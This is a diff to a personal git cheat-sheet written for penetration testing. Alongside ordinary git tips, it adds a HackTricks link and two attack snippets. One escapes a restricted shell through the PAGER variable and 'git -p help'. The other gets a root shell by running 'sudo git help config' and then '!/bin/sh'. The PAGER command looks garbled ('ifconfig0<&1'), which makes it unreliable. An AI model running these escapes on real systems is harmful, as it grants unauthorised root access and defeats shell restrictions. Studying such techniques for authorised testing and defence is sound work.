@@ -14,7 +14,7 @@ Search Tag: #📕
 ___
 
 ## Description:  
-
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/git
 ### Setting up a .git folder
 
 ```
@@ -50,9 +50,19 @@ to go back to a specific commit:
 git revert 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
 ```
 
+### Break out of restricted shells
+```
+PAGER='sh -c "exec ifconfig0<&1"' git -p help
+```
+
+### Exploiting Sudo Rights
+
+```
+sudo git help config
+!/bin/sh
 
 
-
+```
 
 ___
 
